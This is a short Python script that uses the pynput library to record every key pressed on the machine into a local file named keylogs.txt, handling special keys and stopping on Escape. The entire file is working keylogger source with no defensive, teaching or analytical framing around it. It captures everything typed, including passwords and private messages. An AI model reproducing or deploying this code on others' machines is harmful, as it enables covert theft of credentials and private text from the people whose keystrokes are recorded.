import pynput
from pynput.keyboard import Key, Listener

# Specify the file where the logs will be saved
log_file = "keylogs.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (like space, enter, etc.)
        with open(log_file, "a") as file:
            if key == Key.space:
                file.write(" ")
            elif key == Key.enter:
                file.write("\n")
            else:
                file.write(f"{key}")

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
